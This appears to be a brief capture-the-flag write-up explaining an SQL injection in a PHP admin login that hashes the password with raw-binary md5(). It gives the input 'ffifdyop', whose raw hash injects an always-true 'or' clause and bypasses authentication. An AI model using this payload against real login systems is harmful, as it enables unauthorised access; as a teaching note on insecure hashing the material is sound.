<br>Looking at the php code, there is a line.</br>
SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'  
<br>SQLi can be done if we submit ffifdyop.</br>
Because when the second parameter of md5(,) is true, it returns a raw binary type which can be read as characters.If we input like ffifdyop, the sql request is SELECT * FROM admin WHERE username = 'admin' and password = ''or'<trash>'  
trash is a none-zero value , SQLi.
